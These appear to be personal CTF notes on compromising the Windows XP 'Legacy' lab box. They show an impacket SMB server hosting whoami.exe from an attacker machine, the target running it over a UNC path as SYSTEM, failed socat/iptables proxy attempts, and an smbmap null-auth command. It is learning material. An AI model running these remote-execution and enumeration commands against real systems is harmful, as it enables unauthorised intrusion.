
| **INDEX**                         |
| --------------------------------- |
| impacket-smbserver                |
| socat                             |
| iptables                          |
| smb exploit using ms08_067_netapi |


I was able to start the smbserver using the following command
```
$ impacket-smbserver a /usr/share/windows-resources/binaries/
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.4,1033)
[*] AUTHENTICATE_MESSAGE (\,LEGACY)
[*] User LEGACY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[-] TreeConnectAndX not found WHOAMI.EXE
[-] TreeConnectAndX not found WHOAMI.EX
[*] Closing down connection (10.10.10.4,1033)
[*] Remaining connections []
[*] Incoming connection (10.10.10.4,1036)
[*] AUTHENTICATE_MESSAGE (\,LEGACY)
[*] User LEGACY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa

```

This was to host whoami.exe on kali machine. On a target machine, I ran the following command to check the username. 

```
\\10.10.16.5\a\whoami.exe
\\10.10.16.5\a\whoami.exe
NT AUTHORITY\SYSTEM

```

This was the Windows XP box. Easy to pwn. I failed to fireout how to setup a proxy that i can monitor when the payload is being sent on port 445. I tried socat and iptables but it didn't workl

I setup an iptable rule to forward all the traffic received on port 4444 to my burp 8080 but didn't work. I also tried to use 
```
socat TCP-LISTEN:4444,fork TCP:127.0.0.1:8080
```

The above command listen on port 4444 and forward the traffic to burp on port 8080. Didn't work. 

##### SMB Null Auth
```
smbmap -H <IP>
```